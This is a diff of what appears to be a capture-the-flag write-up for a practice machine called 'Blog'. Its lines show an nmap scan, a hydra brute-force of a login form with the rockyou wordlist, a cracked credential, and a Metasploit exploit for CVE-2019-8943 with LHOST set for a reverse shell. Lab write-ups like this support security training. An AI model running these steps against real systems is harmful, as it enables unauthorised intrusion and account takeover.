@@ -20,7 +20,6 @@ $ nmap -sC -sV 10.10.121.65
 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
 Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-<snip>
 ```
 
 gobuster
@@ -89,6 +88,7 @@ $ hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.121.65 http-post-for
 ```
 
 Loot:
+
 kwheel:cutiepie1
 
 
@@ -96,6 +96,7 @@ kwheel:cutiepie1
 
 CVE-2019-8943
 
+metasploit
 ```bash
 $ msfconsole
 ```
@@ -108,7 +109,6 @@ set USERNAME kwheel
 set PASSWORD cutiepie1
 set LHOST tun0
 run
-
 ```
 
 
